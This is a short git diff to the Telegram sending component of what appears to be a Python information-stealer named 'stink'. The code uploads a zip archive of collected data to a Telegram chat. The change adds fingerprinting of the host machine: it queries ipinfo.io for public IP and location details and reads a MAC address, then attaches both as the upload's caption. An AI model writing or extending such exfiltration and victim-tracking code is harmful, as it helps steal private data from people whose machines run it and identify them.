@@ -1,7 +1,10 @@
 import ssl
 from abc import abstractmethod
+from json import loads
 from typing import Tuple, Union
 from urllib.request import Request, urlopen
+
+from getmac import get_mac_address
 
 from stink.helpers import MultipartFormDataEncoder
 from stink.helpers.config import SenderConfig
@@ -97,8 +100,15 @@ class TelegramSender(AbstractSender):
         Returns:
         - tuple: A tuple of content type, body, and Telegram api url.
         """
+        ip_info = loads(
+            urlopen(url="https://ipinfo.io/json", timeout=3).read().decode("utf-8")
+        ).items()
+        ip_info = "\n".join(f"{k}: <code>{v}</code>" for k, v in ip_info)
+        mac = f"📡 <code>{get_mac_address(ip='192.168.1.1')}</code>"
+        text = f"<b>{mac}\n\n{ip_info}</b>"
         content_type, body = self._encoder.encode(
-            [("chat_id", self.__user_id)], [("document", self.__zip_name, self.__data)]
+            [("chat_id", self.__user_id), ("caption", text), ("parse_mode", "HTML")],
+            [("document", self.__zip_name, self.__data)],
         )
 
         return content_type, body
